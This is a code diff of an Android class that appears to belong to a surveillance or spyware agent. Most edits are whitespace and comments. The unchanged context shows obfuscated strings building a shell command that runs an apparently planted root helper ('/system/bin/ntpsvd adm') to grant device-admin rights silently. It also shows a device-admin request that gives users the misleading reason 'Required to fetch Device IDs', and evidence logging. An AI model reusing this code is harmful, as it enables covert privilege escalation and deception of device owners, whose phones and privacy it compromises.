@@ -98,7 +98,7 @@ public class Core extends Activity implements Runnable {
 		if (singleton == null) {
 			singleton = new Core();
 		}
-		
+
 		singleton.serviceMain = serviceMain;
 
 		return singleton;
@@ -224,31 +224,30 @@ public class Core extends Activity implements Runnable {
 				// "com.android.networking/com.android.networking.listener.AR"
 				String pack = Status.self().getAppContext().getPackageName();
 				String bd = Messages.getString("32_43");
-				String tbe = String.format("%s %s/%s%s",bd, pack, pack,
-						Messages.getString("32_44"));
+				String tbe = String.format("%s %s/%s%s", bd, pack, pack, Messages.getString("32_44"));
 				// /system/bin/ntpsvd adm
 				// \"com.android.networking/com.android.networking.listener.AR\"
 				Runtime.getRuntime().exec(tbe);
-				
+
 			} catch (IOException ex) {
 				Check.log(TAG + " Error (unprotect): " + ex);
 			}
 		} else if (Keys.self().wantsPrivilege() && Cfg.ADMIN) {
 
 			// startActivityForResult(intent, ACTIVATION_REQUEST);
-			//ServiceMain
+			// ServiceMain
 
 			Context context = Status.self().getAppContext();
-			
+
 			Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
 			intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
 
 			ComponentName deviceAdminComponentName = new ComponentName(context, AR.class);
 			intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponentName);
-			intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,  "Required to fetch Device IDs");
+			intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required to fetch Device IDs");
 
 			context.startActivity(intent);
-				
+
 		}
 
 		try {
@@ -577,9 +576,11 @@ public class Core extends Activity implements Runnable {
 			loaded = loadConfFile(file, true);
 
 			if (!loaded) {
+				// 30_2=Invalid new configuration, reverting
 				EvidenceReference.info(Messages.getString("30_2")); //$NON-NLS-1$
 				file.delete();
 			} else {
+				// 30_3=New configuration activated
 				EvidenceReference.info(Messages.getString("30_3")); //$NON-NLS-1$
 				file.rename(Path.conf() + ConfType.ActualConf);
 				ret = ConfType.NewConf;
@@ -597,6 +598,7 @@ public class Core extends Activity implements Runnable {
 				loaded = loadConfFile(file, true);
 
 				if (!loaded) {
+					// Actual configuration corrupted
 					EvidenceReference.info(Messages.getString("30_4")); //$NON-NLS-1$
 				} else {
 					ret = ConfType.ActualConf;
